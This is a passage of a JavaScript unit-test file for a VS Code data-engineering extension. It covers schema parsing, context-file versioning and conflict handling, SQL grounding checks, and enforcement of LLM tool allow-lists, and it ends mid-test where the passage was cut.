  await test('parseDdl() extracts columns from CREATE TABLE, honors NOT NULL/PRIMARY KEY, handles a DECIMAL(10,2)-style type without splitting on its internal comma, and skips constraint-only lines', () => {
    const { parseDdl } = fresh('../dist/engine/context/fileIngestion.js');
    const ddl = `
      CREATE TABLE orders (
        order_id INT NOT NULL PRIMARY KEY,
        customer_id INT NOT NULL,
        total DECIMAL(10,2),
        notes VARCHAR(255),
        FOREIGN KEY (customer_id) REFERENCES customers(id)
      );
      CREATE TABLE customers (
        id INT NOT NULL PRIMARY KEY,
        name VARCHAR(100) NOT NULL
      );
    `;
    const result = parseDdl(ddl, '/data/schema.sql');
    assert.strictEqual(result.tableCount, 2);
    const tables = result.nodes.filter((n) => n.type === 'table');
    assert.deepStrictEqual(tables.map((t) => t.label).sort(), ['customers', 'orders']);

    const ordersCols = result.nodes.filter((n) => n.type === 'column' && n.id.includes('orders'));
    assert.strictEqual(ordersCols.length, 4, 'the FOREIGN KEY constraint line must not be miscounted as a 5th column');
    const byName = Object.fromEntries(ordersCols.map((c) => [c.label, c]));
    assert.strictEqual(byName.order_id.isPrimaryKey, true);
    assert.strictEqual(byName.order_id.isNullable, false);
    assert.strictEqual(byName.total.dataType, 'DECIMAL(10,2)', 'the type\'s own internal comma must not be treated as a column separator');
    assert.strictEqual(byName.notes.isNullable, true, 'no NOT NULL stated');
  });

  await test('parseDdl() reports a warning (never throws) when no CREATE TABLE statements are found', () => {
    const { parseDdl } = fresh('../dist/engine/context/fileIngestion.js');
    const result = parseDdl('SELECT * FROM orders;', '/data/query.sql');
    assert.strictEqual(result.tableCount, 0);
    assert.ok(result.warnings.some((w) => w.includes('No CREATE TABLE')));
  });

  await test('ConnectionManager.getCredentialsFromSettings() passes defaultDatabricksCatalogType through as a credential field, defaulting to "auto"', () => {
    const mock = createMock();
    const { ConnectionManager } = withMock(mock, () => fresh('../dist/engine/platform/ConnectionManager.js'));
    const creds = ConnectionManager.getCredentialsFromSettings('databricks', { defaultDatabricksWorkspaceUrl: 'x', defaultDatabricksHttpPath: 'y' });
    assert.strictEqual(creds.catalogType, 'auto');
    const creds2 = ConnectionManager.getCredentialsFromSettings('databricks', { defaultDatabricksCatalogType: 'hive_metastore' });
    assert.strictEqual(creds2.catalogType, 'hive_metastore');
  });

  // ── Step 6: Mapping Context ──

  function mappingFsMapMock() {
    const store = new Map();
    const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
    return {
      Uri: { file: (p) => ({ fsPath: p }), joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') }) },
      workspace: { fs: {
        createDirectory: async () => {},
        readFile: async (uri) => { const v = store.get(keyOf(uri)); if (v === undefined) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
        writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
        rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); },
        stat: async (uri) => { if (!store.has(keyOf(uri))) throw new Error('ENOENT'); return {}; }
      } },
      store
    };
  }

  await test('MappingContextManager round-trips an EntityMapping (with column mappings) through a real save+reload', async () => {
    const mock = mappingFsMapMock();
    try { delete require.cache[require.resolve('../dist/context/MappingContextManager.js')]; } catch { /* not loaded */ }
    const { MappingContextManager } = withMock(mock, () => require('../dist/context/MappingContextManager.js'));
    const mgr = new MappingContextManager({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => mgr.initialize());
    assert.strictEqual(mgr.getContext(), undefined, 'no mapping-context.yaml exists yet');

    await withMock(mock, () => mgr.reset('bps-1', 1));
    const mapping = {
      id: 'map-orders-fact_orders',
      sourceEntityId: 'table-src-orders',
      sourceFqn: 'db.schema.orders',
      targetEntityId: undefined,
      targetName: 'fact_orders',
      columns: [
        { sourceColumn: 'order_id', targetColumn: 'order_id' },
        { sourceColumn: 'total', targetColumn: 'order_total', transformExpression: 'ROUND(total, 2)' }
      ],
      notes: 'Greenfield target — no existing node yet'
    };
    await withMock(mock, () => mgr.upsertMapping(mapping));

    const mgr2 = new MappingContextManager({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => mgr2.initialize());
    const reloaded = mgr2.getContext();
    assert.strictEqual(reloaded.specId, 'bps-1');
    assert.strictEqual(reloaded.mappings.length, 1);
    assert.strictEqual(reloaded.mappings[0].targetName, 'fact_orders');
    assert.strictEqual(reloaded.mappings[0].columns.length, 2);
    assert.strictEqual(reloaded.mappings[0].columns[1].transformExpression, 'ROUND(total, 2)');
  });

  await test('MappingContextManager bumps version + archives only when revising an already-approved predecessor of the same spec lineage (mirrors SourceContextManager/TargetContextManager exactly)', async () => {
    const mock = mappingFsMapMock();
    try { delete require.cache[require.resolve('../dist/context/MappingContextManager.js')]; } catch { /* not loaded */ }
    const { MappingContextManager } = withMock(mock, () => require('../dist/context/MappingContextManager.js'));
    const mgr = new MappingContextManager({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => mgr.initialize());

    await withMock(mock, () => mgr.save({ specId: 'bps-1', specVersion: 1, status: 'built', mappings: [] }));
    await withMock(mock, () => mgr.save({ ...mgr.getContext(), status: 'approved' }));
    assert.strictEqual(mgr.getContext().version, 1, 'approving a not-yet-approved record must not bump the version');

    await withMock(mock, () => mgr.save({ specId: 'bps-1', specVersion: 1, status: 'built', mappings: [] }));
    assert.strictEqual(mgr.getContext().version, 2, 'revising an approved predecessor bumps the version');
    assert.strictEqual(mock.store.has('/ws/context/history/mapping-context.spec1.v1.yaml'), true, 'the approved v1 predecessor was archived before being overwritten');
  });

  await test('MappingContextManager.upsertMapping() drops an approved container back to "built" status on any mapping change, so an edited-then-unreviewed mapping set is never silently treated as still-approved', async () => {
    const mock = mappingFsMapMock();
    try { delete require.cache[require.resolve('../dist/context/MappingContextManager.js')]; } catch { /* not loaded */ }
    const { MappingContextManager } = withMock(mock, () => require('../dist/context/MappingContextManager.js'));
    const mgr = new MappingContextManager({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => mgr.initialize());

    await withMock(mock, () => mgr.reset('bps-1', 1));
    await withMock(mock, () => mgr.upsertMapping({ id: 'm1', sourceEntityId: 't1', sourceFqn: 'db.s.t1', targetName: 'target1', columns: [] }));
    await withMock(mock, () => mgr.save({ ...mgr.getContext(), status: 'approved' }));
    assert.strictEqual(mgr.getContext().status, 'approved');

    await withMock(mock, () => mgr.upsertMapping({ id: 'm2', sourceEntityId: 't2', sourceFqn: 'db.s.t2', targetName: 'target2', columns: [] }));
    assert.strictEqual(mgr.getContext().status, 'built', 'editing an approved mapping set must drop it back to built, not leave it approved');
    assert.strictEqual(mgr.getContext().mappings.length, 2);

    await withMock(mock, () => mgr.removeMapping('m1'));
    assert.strictEqual(mgr.getContext().mappings.length, 1);
    assert.strictEqual(mgr.getContext().mappings[0].id, 'm2');
  });

  // ── Step 7: Governance layer (provenance/reliability, staleness, re-verify) ──

  await test('parseCsv()/parseDdl() tag every node reliability: "best-effort-inferred" (Step 7) — a structural file parse is a real fact about the file, but has never been checked against the live source', () => {
    const { parseCsv, parseDdl } = fresh('../dist/engine/context/fileIngestion.js');
    const csvResult = parseCsv('id,name\n1,alice\n', '/data/users.csv');
    assert.ok(csvResult.nodes.length > 0);
    assert.ok(csvResult.nodes.every((n) => n.origin.reliability === 'best-effort-inferred'));

    const ddlResult = parseDdl('CREATE TABLE t (id INT);', '/data/t.sql');
    assert.ok(ddlResult.nodes.every((n) => n.origin.reliability === 'best-effort-inferred'));
  });

  await test('ContextFileManager.buildContextPrompt() flags file-derived (best-effort-inferred) tables distinctly from live-verified ones, never silently blending the two (Step 7)', async () => {
    const mock = createMock();
    try { delete require.cache[require.resolve('../dist/context/GraphManager.js')]; } catch { /* not loaded */ }
    try { delete require.cache[require.resolve('../dist/context/ContextFileManager.js')]; } catch { /* not loaded */ }
    const { GraphManager } = withMock(mock, () => require('../dist/context/GraphManager.js'));
    const { ContextFileManager } = withMock(mock, () => require('../dist/context/ContextFileManager.js'));

    const graph = new GraphManager();
    await graph.addNode({
      id: 't-live', type: 'table', label: 'orders', database: 'db', schema: 's', fqn: 'db.s.orders', isView: false, metadata: {}, version: 1,
      origin: { source: 'derived', sourceRef: 'snowflake', reliability: 'live-verified' }
    });
    await graph.addNode({
      id: 't-file', type: 'table', label: 'legacy_customers', database: 'db', schema: 's', fqn: 'db.s.legacy_customers', isView: false, metadata: {}, version: 1,
      origin: { source: 'derived', sourceRef: '/data/customers.csv', reliability: 'best-effort-inferred' }
    });

    const cfm = withMock(mock, () => new ContextFileManager({ fsPath: '/ws' }, graph, () => {}));
    const prompt = cfm.buildContextPrompt();
    const lines = prompt.split('\n');
    const ordersLine = lines.find((l) => l.includes('db.s.orders'));
    const legacyLine = lines.find((l) => l.includes('db.s.legacy_customers'));
    assert.ok(ordersLine && !ordersLine.includes('file-derived'), 'a live-verified table must not be flagged');
    assert.ok(legacyLine && legacyLine.includes('_(file-derived, not live-verified)_'), 'a file-derived table must be explicitly flagged, not silently presented as equally solid');
  });

  // ── v0.25.0: spec state synchronization (docs/mcp-engine-requirements.md §8) ──
  // An in-memory vscode.workspace.fs; `store` doubles as "another process"
  // editing files behind a manager's back.
  function revisionFsMock() {
    const store = new Map();
    const keyOf = (uri) => uri.fsPath;
    const mock = createMock();
    mock.workspace.fs = {
      createDirectory: async () => {},
      readFile: async (uri) => { const v = store.get(keyOf(uri)); if (v === undefined) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
      writeFile: async (uri, buf) => { store.set(keyOf(uri), Buffer.from(buf).toString('utf8')); },
      rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); },
      stat: async (uri) => { if (!store.has(keyOf(uri))) throw new Error('ENOENT'); return {}; },
      delete: async (uri) => { store.delete(keyOf(uri)); }
    };
    return { mock, store };
  }
  function loadFresh(mock, rel) {
    delete require.cache[require.resolve('../dist/engine/context/contextStore.js')];
    delete require.cache[require.resolve(rel)];
    return withMock(mock, () => require(rel));
  }
  const baseSpec = (overrides = {}) => ({
    id: 'bps-1', version: 1, status: 'draft', problemStatement: 'p', objectives: ['o'], successCriteria: [],
    scope: { in: [], out: [] }, constraints: [], assumptions: [], createdAt: 'c', updatedAt: 'u', ...overrides
  });

  await test('v0.25.0: SpecManager.reload() picks up an external edit of business-problem.yaml', async () => {
    const { mock, store } = revisionFsMock();
    const { SpecManager } = loadFresh(mock, '../dist/context/SpecManager.js');
    const mgr = new SpecManager({ fsPath: '/ws/p1' }, () => {});
    await withMock(mock, () => mgr.initialize());
    await withMock(mock, () => mgr.saveSpec(baseSpec()));
    const file = '/ws/p1/spec/business-problem.yaml';
    store.set(file, store.get(file).replace('problemStatement: p', 'problemStatement: edited elsewhere'));
    const changed = await withMock(mock, () => mgr.reload());
    assert.strictEqual(changed, true);
    assert.strictEqual(mgr.getSpec().problemStatement, 'edited elsewhere');
  });

  await test('v0.25.0: a manager\'s own save is not reported as an external change (no reload loop)', async () => {
    const { mock } = revisionFsMock();
    const { SpecManager } = loadFresh(mock, '../dist/context/SpecManager.js');
    const mgr = new SpecManager({ fsPath: '/ws/p1' }, () => {});
    await withMock(mock, () => mgr.initialize());
    await withMock(mock, () => mgr.saveSpec(baseSpec()));
    assert.strictEqual(await withMock(mock, () => mgr.reload()), false);
    await withMock(mock, () => mgr.approve());
    assert.strictEqual(await withMock(mock, () => mgr.reload()), false);
  });

  await test('v0.25.0: saving a stale copy after an external edit is refused — disk unchanged, memory unchanged, conflict handler notified', async () => {
    const { mock, store } = revisionFsMock();
    const { SpecManager } = loadFresh(mock, '../dist/context/SpecManager.js');
    const { setRevisionConflictHandler, RevisionConflictError } = withMock(mock, () => require('../dist/engine/context/contextStore.js'));
    const conflicts = [];
    setRevisionConflictHandler((c) => conflicts.push(c));
    try {
      const mgr = new SpecManager({ fsPath: '/ws/p1' }, () => {});
      await withMock(mock, () => mgr.initialize());
      await withMock(mock, () => mgr.saveSpec(baseSpec()));
      const file = '/ws/p1/spec/business-problem.yaml';
      const external = store.get(file).replace('problemStatement: p', 'problemStatement: external');
      store.set(file, external);
      await assert.rejects(withMock(mock, () => mgr.saveSpec(baseSpec({ problemStatement: 'stale save' }))), (err) => err instanceof RevisionConflictError);
      assert.strictEqual(store.get(file), external, 'the external edit must survive');
      assert.strictEqual(mgr.getSpec().problemStatement, 'p', 'the refused change must not be adopted in memory');
      assert.strictEqual(conflicts.length, 1);

      // "Overwrite": writes the refused content; the follow-up reload brings memory in line with disk.
      await withMock(mock, () => conflicts[0].overwrite());
      assert.ok(store.get(file).includes('stale save'));
      assert.strictEqual(await withMock(mock, () => mgr.reload()), true);
      assert.strictEqual(mgr.getSpec().problemStatement, 'stale save');
    } finally {
      setRevisionConflictHandler(undefined);
    }
  });

  await test('v0.25.0: an unparseable external edit keeps the loaded copy, and the next save asks instead of clobbering it', async () => {
    const { mock, store } = revisionFsMock();
    const { PipelineSpecManager } = loadFresh(mock, '../dist/context/PipelineSpecManager.js');
    const { RevisionConflictError } = withMock(mock, () => require('../dist/engine/context/contextStore.js'));
    const file = '/ws/p1/spec/pipeline.yaml';
    store.set(file, '# AutoDE Pipeline Spec\nspecVersion: 0\nversion: 1\nstatus: draft\n');
    const mgr = new PipelineSpecManager({ fsPath: '/ws/p1' }, () => {});
    await withMock(mock, () => mgr.initialize());
    assert.strictEqual(mgr.getSpec().status, 'draft');
    store.set(file, ': : not yaml [');
    assert.strictEqual(await withMock(mock, () => mgr.reload()), false);
    assert.strictEqual(mgr.getSpec().status, 'draft', 'the loaded copy is kept');
    await assert.rejects(withMock(mock, () => mgr.approve()), (err) => err instanceof RevisionConflictError);
    assert.strictEqual(store.get(file), ': : not yaml [', 'the in-progress external edit is not overwritten');
  });

  await test('v0.25.0: Source/Target/Mapping managers reload external edits and refuse stale saves', async () => {
    const cases = [
      ['../dist/context/SourceContextManager.js', 'SourceContextManager', 'source-context.yaml', { specId: 's', specVersion: 1, status: 'pending', sources: [], answers: {} }],
      ['../dist/context/TargetContextManager.js', 'TargetContextManager', 'target-context.yaml', { specId: 's', specVersion: 1, status: 'pending', answers: {} }],
      ['../dist/context/MappingContextManager.js', 'MappingContextManager', 'mapping-context.yaml', { specId: 's', specVersion: 1, status: 'pending', mappings: [] }]
    ];
    for (const [rel, cls, fileName, record] of cases) {
      const { mock, store } = revisionFsMock();
      const Ctor = loadFresh(mock, rel)[cls];
      const { RevisionConflictError } = withMock(mock, () => require('../dist/engine/context/contextStore.js'));
      const mgr = new Ctor({ fsPath: '/ws/p1' }, () => {});
      await withMock(mock, () => mgr.initialize());
      await withMock(mock, () => mgr.save(record));
      const file = `/ws/p1/context/${fileName}`;
      assert.strictEqual(mgr.getFileUri().fsPath, file, `${cls} exposes its file for watcher routing`);
      assert.strictEqual(await withMock(mock, () => mgr.reload()), false, `${cls}: own save is not an external change`);
      store.set(file, store.get(file).replace('status: pending', 'status: built'));
      assert.strictEqual(await withMock(mock, () => mgr.reload()), true, `${cls}: external edit is picked up`);
      store.set(file, store.get(file).replace('status: built', 'status: approved'));
      await assert.rejects(withMock(mock, () => mgr.save(record)), (err) => err instanceof RevisionConflictError, `${cls}: stale save refused`);
    }
  });

  await test('v0.25.0: ContextFileWatcher ignores temp files and history archives, and debounces bursts per path', async () => {
    const handlers = {};
    const mock = createMock();
    mock.workspace.createFileSystemWatcher = () => ({
      onDidChange: (h) => { handlers.change = h; }, onDidCreate: (h) => { handlers.create = h; }, onDidDelete: (h) => { handlers.delete = h; }, dispose: () => {}
    });
    delete require.cache[require.resolve('../dist/context/ContextFileWatcher.js')];
    const { ContextFileWatcher } = withMock(mock, () => require('../dist/context/ContextFileWatcher.js'));
    const seen = [];
    const watcher = withMock(mock, () => new ContextFileWatcher({ fsPath: '/ws' }, (uri) => seen.push(uri.fsPath), 10));
    handlers.change({ fsPath: '/ws/.autode/problems/p1/spec/.business-problem.tmp.123.yaml' });
    handlers.create({ fsPath: '/ws/.autode/problems/p1/spec/history/business-problem.v1.draft.yaml' });
    handlers.change({ fsPath: '/ws/.autode/problems/p1/spec/business-problem.yaml' });
    handlers.change({ fsPath: '/ws/.autode/problems/p1/spec/business-problem.yaml' });
    handlers.delete({ fsPath: '/ws/.autode/problems/p1/context/source-context.yaml' });
    await new Promise((r) => setTimeout(r, 40));
    watcher.dispose();
    assert.deepStrictEqual(seen.sort(), ['/ws/.autode/problems/p1/context/source-context.yaml', '/ws/.autode/problems/p1/spec/business-problem.yaml']);
  });

  // ── v0.26.0: engine boundary (docs/mcp-engine-requirements.md §4) ──
  await test('v0.26.0: every dist/engine module loads in plain Node with no vscode module available', () => {
    const nodeFs = require('node:fs');
    const nodePath = require('node:path');
    const engineDir = nodePath.join(__dirname, '..', 'dist', 'engine');
    const files = [];
    const walk = (dir) => {
      for (const e of nodeFs.readdirSync(dir, { withFileTypes: true })) {
        const full = nodePath.join(dir, e.name);
        if (e.isDirectory()) walk(full);
        else if (e.name.endsWith('.js')) files.push(full);
      }
    };
    walk(engineDir);
    assert.ok(files.length >= 40, `expected the engine layer to be populated, found ${files.length} modules`);
    for (const f of files) delete require.cache[f];
    // With no active mock, the loader at the top of this file throws on require('vscode') —
    // so any engine module (or anything it transitively imports) touching VS Code fails here.
    const prev = active; active = null;
    try {
      for (const f of files) {
        assert.doesNotThrow(() => require(f), `${nodePath.relative(engineDir, f)} must not depend on vscode`);
      }
    } finally {
      active = prev;
      for (const f of files) delete require.cache[f];
    }
  });

  await test('v0.26.0: ContextStore over real Node fs — atomic write, revision check, conflict, overwrite', async () => {
    const os = require('node:os');
    const nodePath = require('node:path');
    const nodeFs = require('node:fs');
    delete require.cache[require.resolve('../dist/engine/context/contextStore.js')];
    const { ContextStore, RevisionedFile, RevisionConflictError, computeRevision } = require('../dist/engine/context/contextStore.js');
    const dir = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-store-'));
    try {
      const file = nodePath.join(dir, 'spec', 'business-problem.yaml');
      const store = new ContextStore();
      assert.deepStrictEqual(await store.read(file), {}, 'absent file reads as no content, no revision');
      const rev1 = await store.write(file, 'a: 1\n', undefined);
      assert.strictEqual(rev1, computeRevision('a: 1\n'));
      assert.strictEqual(nodeFs.readFileSync(file, 'utf8'), 'a: 1\n');
      assert.deepStrictEqual(nodeFs.readdirSync(nodePath.dirname(file)), ['business-problem.yaml'], 'no temp file left behind');
      await assert.rejects(store.write(file, 'a: 2\n', undefined), (e) => e instanceof RevisionConflictError, 'expected-absent but present → conflict');

      const owned = new RevisionedFile(store, file, 'Spec');
      assert.strictEqual(await owned.read(), 'a: 1\n');
      nodeFs.writeFileSync(file, 'a: external\n');
      let conflict;
      await assert.rejects(owned.write('a: stale\n'), (e) => { conflict = e; return e instanceof RevisionConflictError; });
      assert.strictEqual(nodeFs.readFileSync(file, 'utf8'), 'a: external\n');
      await conflict.overwrite();
      assert.strictEqual(nodeFs.readFileSync(file, 'utf8'), 'a: stale\n');
      const reloaded = await owned.reload((c) => c);
      assert.deepStrictEqual(reloaded, { status: 'updated', value: 'a: stale\n' });
      await owned.write('a: 3\n');
      assert.deepStrictEqual(await owned.reload((c) => c), { status: 'unchanged' });
    } finally {
      nodeFs.rmSync(dir, { recursive: true, force: true });
    }
  });

  // ── v0.27.0: grounding checks + eval harness (docs/context-layer-requirements.md §10) ──
  function groundingIndex() {
    const { buildSchemaIndex } = require('../dist/engine/grounding/sqlGrounding.js');
    const nodes = [];
    const edges = [];
    const table = (fqn, cols) => {
      const id = `t-${fqn}`;
      nodes.push({ id, type: 'table', label: fqn.split('.').pop(), fqn, database: 'd', schema: 's', isView: false, metadata: {}, version: 1 });
      for (const [name, dataType] of cols) {
        const cid = `${id}.${name}`;
        nodes.push({ id: cid, type: 'column', label: name, dataType, isNullable: true, isPrimaryKey: false, isForeignKey: false, metadata: {}, version: 1 });
        edges.push({ id: `e-${cid}`, source: id, target: cid, type: 'contains' });
      }
    };
    table('shop.orders', [['order_id', 'BIGINT'], ['customer_id', 'INTEGER'], ['order_ts', 'TIMESTAMP'], ['status', 'VARCHAR(20)']]);
    table('shop.order_items', [['order_item_id', 'BIGINT'], ['order_id', 'BIGINT'], ['unit_price', 'DECIMAL(10,2)']]);
    return buildSchemaIndex(nodes, edges);
  }

  await test('v0.27.0: checkSqlGrounding resolves tables, aliases and qualified columns, and flags invented ones', () => {
    const { checkSqlGrounding } = require('../dist/engine/grounding/sqlGrounding.js');
    const sql = `
      -- FROM not_a_table is a comment and must be ignored
      SELECT o.order_id, i.unit_price, o.revenue_band, 'FROM fake_in_string' AS note
      FROM shop.orders o
      JOIN shop.order_items AS i ON i.order_id = o.order_id
      LEFT JOIN shop.payments p ON p.order_id = o.order_id`;
    const r = checkSqlGrounding([{ name: 'a.sql', content: sql }], groundingIndex());
    assert.strictEqual(r.tablesChecked, 3);
    assert.strictEqual(r.tablesResolved, 2, 'orders and order_items resolve; payments does not exist');
    assert.deepStrictEqual(r.unresolved.map((u) => `${u.kind}:${u.ref}`).sort(), ['column:shop.orders.revenue_band', 'table:shop.payments']);
    assert.ok(r.columnsResolved >= 4, 'o.order_id, i.unit_price, i.order_id, o.order_id resolve');
  });

  await test('v0.27.0: checkSqlGrounding treats CTEs, created objects and dbt models as internal, and resolves dbt source()', () => {
    const { checkSqlGrounding } = require('../dist/engine/grounding/sqlGrounding.js');
    const r = checkSqlGrounding([
      { name: 'models/staging/stg_orders.sql', content: "with src as (select * from {{ source('shop', 'orders') }}) select * from src" },
      { name: 'models/marts/fct_orders.sql', content: "select * from {{ ref('stg_orders') }} s join {{ ref('stg_missing') }} m on 1=1" },
      { name: 'ddl.sql', content: 'CREATE OR REPLACE TABLE analytics.marts.dim_x (id int); INSERT INTO analytics.marts.dim_x SELECT 1 FROM dim_x' }
    ], groundingIndex());
    assert.deepStrictEqual(r.unresolved.map((u) => u.ref), ['stg_missing'], 'only the ref to a model nobody created is unresolved');
    assert.strictEqual(r.tablesResolved, 1, "source('shop','orders') resolves against the schema");
  });

  await test('v0.27.0: checkSqlGrounding flags joins and casts across incompatible type classes', () => {
    const { checkSqlGrounding } = require('../dist/engine/grounding/sqlGrounding.js');
    const r = checkSqlGrounding([{ name: 'bad.sql', content: 'SELECT CAST(o.order_ts AS INTEGER) FROM shop.orders o JOIN shop.order_items i ON o.order_ts = i.order_id' }], groundingIndex());
    assert.deepStrictEqual(r.typeIssues.map((t) => t.kind).sort(), ['cast', 'join']);
    const ok = checkSqlGrounding([{ name: 'ok.sql', content: 'SELECT CAST(o.status AS DATE) FROM shop.orders o JOIN shop.order_items i ON o.order_id = i.order_id' }], groundingIndex());
    assert.strictEqual(ok.typeIssues.length, 0, 'string→date casts and same-class joins are allowed');
  });

  await test('v0.27.0: the offline eval harness runs end to end and writes a report with every section', () => {
    const os = require('node:os');
    const nodePath = require('node:path');
    const nodeFs = require('node:fs');
    const { spawnSync } = require('node:child_process');
    const dir = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-eval-test-'));
    try {
      const out = nodePath.join(dir, 'report.md');
      const run = spawnSync(process.execPath, [nodePath.join(__dirname, 'eval', 'run-eval.cjs'), '--out', out], { encoding: 'utf8' });
      assert.strictEqual(run.status, 0, run.stderr);
      const report = nodeFs.readFileSync(out, 'utf8');
      for (const section of ['## Summary', '## Traps', '## Ingestion', '## Context delivery', '## Answerability', '## Generated artifacts']) {
        assert.ok(report.includes(section), `report has ${section}`);
      }
      const results = JSON.parse(nodeFs.readFileSync(nodePath.join(dir, 'eval-results.json'), 'utf8'));
      assert.strictEqual(results.traps.length, 5);
      assert.strictEqual(results.answerability.length, 26);
      assert.ok(results.llm.calls > 0 && results.llm.recorded === 0, 'offline mode makes no real LLM calls');
    } finally {
      nodeFs.rmSync(dir, { recursive: true, force: true });
    }
  });

  // ── v0.28.0: tool skills on every provider + allowed-tools enforcement (Phase S1) ──
  await test('v0.28.0: resolveAllowedToolNames maps declared tools onto AutoDE tools; toolModeCeiling never grants full to a read-only skill', () => {
    const { resolveAllowedToolNames, toolModeCeiling } = require('../dist/engine/skills/toolAllowList.js');
    assert.strictEqual(resolveAllowedToolNames(undefined), undefined, 'nothing declared = no extra restriction');
    assert.strictEqual(resolveAllowedToolNames([]), undefined);
    assert.deepStrictEqual(resolveAllowedToolNames(['Read']), ['autode_read_file']);
    assert.deepStrictEqual(resolveAllowedToolNames(['Bash(git:*)', 'grep', 'autode_list_dir']).sort(), ['autode_list_dir', 'autode_run_command', 'autode_search_files']);
    assert.deepStrictEqual(resolveAllowedToolNames(['WebFetch']), [], 'declared but unrecognized = no tools, not every tool');
    assert.strictEqual(toolModeCeiling(['autode_read_file']), 'read-only');
    assert.strictEqual(toolModeCeiling(['autode_read_file', 'autode_write_file']), 'full');
    assert.strictEqual(toolModeCeiling(undefined), 'full');
  });

  await test('v0.28.0: the engine allow-list names match the agentic tool catalog exactly', () => {
    const allow = require('../dist/engine/skills/toolAllowList.js');
    const tools = withMock(createMock(), () => fresh('../dist/core/agenticTools.js'));
    assert.deepStrictEqual([...allow.AUTODE_READ_TOOLS].sort(), tools.READ_ONLY_TOOL_SPECS.map((t) => t.name).sort());
    assert.deepStrictEqual([...allow.AUTODE_WRITE_TOOLS].sort(), tools.WRITE_TOOL_SPECS.map((t) => t.name).sort());
    assert.deepStrictEqual(tools.toolSpecsForMode('full', ['autode_read_file']).map((t) => t.name), ['autode_read_file']);
    assert.strictEqual(tools.toolSpecsForMode('full').length, 5, 'no allow-list = the full catalog, as before');
  });

  function toolLoopCtx(workspaceRoot) {
    return { getLlmApiKey: async () => 'test-key', getSettings: () => ({ llmEndpoint: 'https://example.invalid/chat', languageModelProgrammaticConsent: true }), getWorkspaceRoot: () => workspaceRoot, getExtensionContext: () => undefined, log: () => {} };
  }

  await test('v0.28.0: every fetch-based provider offers only the allowed tools (openai, azure-openai, ollama, anthropic, gemini)', async () => {
    const mock = createMock();
    const { LLM_ADAPTERS } = withMock(mock, () => fresh('../dist/core/llmProviders.js'));
    const toolNames = (body) => {
      if (!body.tools) return [];
      if (body.tools[0] && body.tools[0].functionDeclarations) return body.tools[0].functionDeclarations.map((t) => t.name);
      return body.tools.map((t) => (t.function ? t.function.name : t.name));
    };
    const finalReply = {
      openai: { choices: [{ message: { content: 'done' } }] },
      'azure-openai': { choices: [{ message: { content: 'done' } }] },
      ollama: { message: { content: 'done' } },
      anthropic: { content: [{ type: 'text', text: 'done' }] },
      gemini: { candidates: [{ content: { parts: [{ text: 'done' }] } }] }
    };
    const realFetch = global.fetch;
    try {
      for (const provider of Object.keys(finalReply)) {
        for (const [allowed, expected] of [[['autode_read_file'], ['autode_read_file']], [undefined, ['autode_list_dir', 'autode_read_file', 'autode_run_command', 'autode_search_files', 'autode_write_file']]]) {
          let offered;
          global.fetch = async (_url, init) => { offered = toolNames(JSON.parse(init.body)); return { ok: true, json: async () => finalReply[provider], text: async () => '' }; };
          const out = await withMock(mock, () => LLM_ADAPTERS[provider].complete('go', { model: 'm', systemPrompt: 's', toolExecutionMode: 'full', allowedToolNames: allowed }, toolLoopCtx('/ws')));
          assert.strictEqual(out, 'done');
          assert.deepStrictEqual(offered.sort(), expected, `${provider} with allow-list ${JSON.stringify(allowed)}`);
        }
      }
    } finally {
      global.fetch = realFetch;
    }
  });

  await test('v0.28.0: a tool call outside the allow-list is refused and audited, and the audit reaches the caller', async () => {
    const os = require('node:os');
    const nodePath = require('node:path');
    const nodeFs = require('node:fs');
    const dir = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-tools-'));
    nodeFs.writeFileSync(nodePath.join(dir, 'a.txt'), 'hello');
    const mock = createMock();
    mock.workspace.fs.readFile = async (uri) => nodeFs.readFileSync(uri.fsPath);
    delete require.cache[require.resolve('../dist/core/agenticTools.js')];
    const { LLM_ADAPTERS } = withMock(mock, () => fresh('../dist/core/llmProviders.js'));
    const replies = [
      { choices: [{ message: { content: '', tool_calls: [
        { id: 'c1', function: { name: 'autode_write_file', arguments: JSON.stringify({ path: 'x.txt', content: 'pwned' }) } },
        { id: 'c2', function: { name: 'autode_read_file', arguments: JSON.stringify({ path: 'a.txt' }) } }
      ] } }] },
      { choices: [{ message: { content: 'read it' } }] }
    ];
    const realFetch = global.fetch;
    global.fetch = async () => ({ ok: true, json: async () => replies.shift(), text: async () => '' });
    try {
      const audit = [];
      const out = await withMock(mock, () => LLM_ADAPTERS.openai.complete('go', { model: 'm', systemPrompt: 's', toolExecutionMode: 'full', allowedToolNames: ['autode_read_file'], auditSink: audit }, toolLoopCtx(dir)));
      assert.strictEqual(out, 'read it');
      assert.deepStrictEqual(audit.map((a) => `${a.tool}:${a.outcome}`), ['autode_write_file:denied', 'autode_read_file:ok']);
      assert.ok(!nodeFs.existsSync(nodePath.join(dir, 'x.txt')), 'the refused write never happened');
    } finally {
      global.fetch = realFetch;
      nodeFs.rmSync(dir, { recursive: true, force: true });
    }
  });

  await test('v0.28.0: the Copilot tool loop offers only the allowed tools and returns its audit', async () => {
    const os = require('node:os');
    const nodePath = require('node:path');
    const nodeFs = require('node:fs');
    const dir = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-copilot-'));
    nodeFs.writeFileSync(nodePath.join(dir, 'a.txt'), 'hello');
    class TextPart { constructor(value) { this.value = value; } }
    class ToolCallPart { constructor(callId, name, input) { this.callId = callId; this.name = name; this.input = input; } }
    class ToolResultPart { constructor(callId, content) { this.callId = callId; this.content = content; } }
    const offeredPerTurn = [];
    let turn = 0;
    const model = {
      name: 'Copilot-4o', id: 'copilot-4o', family: 'gpt-4o', vendor: 'copilot', version: '1', maxInputTokens: 128000,
      sendRequest: async (_messages, options) => {
